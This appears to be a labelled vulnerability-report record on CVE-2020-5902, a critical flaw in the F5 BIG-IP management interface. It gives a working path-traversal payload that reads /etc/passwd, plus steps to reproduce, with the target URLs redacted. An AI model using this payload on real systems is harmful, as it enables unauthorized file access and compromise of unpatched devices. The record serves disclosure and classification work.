title: CVE-2020-5902
content:
CVE ID: CVE-2020-5902
Description:
Affected Product: F5 BIG-IP Traffic Management User Interface (TMUI)
Severity: Critical
CVSS Score: 9.8
Description: Remote Code Execution (RCE) vulnerability in undisclosed pages of the TMUI
CVE-2020-5902 is a critical vulnerability affecting the BIG-IP Traffic Management User Interface (TMUI), also known as the Configuration utility. This vulnerability allows for Remote Code Execution (RCE) in undisclosed pages of the TMUI.
Affected Versions
BIG-IP versions ████
BIG-IP versions █████
BIG-IP versions ███
BIG-IP versions ███
BIG-IP versions ███
Steps To Reproduce:
URL :
███
payload used :/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
Full URL:
█████████?fileName=/etc/passwd
Impact
Summary:
The vulnerability can be exploited by an attacker to execute arbitrary code on the affected system, leading to unauthorized access, data breaches, and system compromise.
steps: Access the F5 BIG-IP TMUI using the vulnerable URL structure
Append the payload '/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' to the URL to read system files
vuln_description: CVE-2020-5902 is a critical Remote Code Execution (RCE) vulnerability in the F5 BIG-IP Traffic Management User Interface (TMUI). It allows attackers to execute arbitrary code by exploiting a path traversal issue in undisclosed pages of the TMUI, leading to unauthorized access and potential system compromise.
reason: The vulnerability involves a simple path traversal technique that is well-documented and does not require complex interactions or state manipulation. The attack vector is straightforward and does not involve novel logic or multiple components.
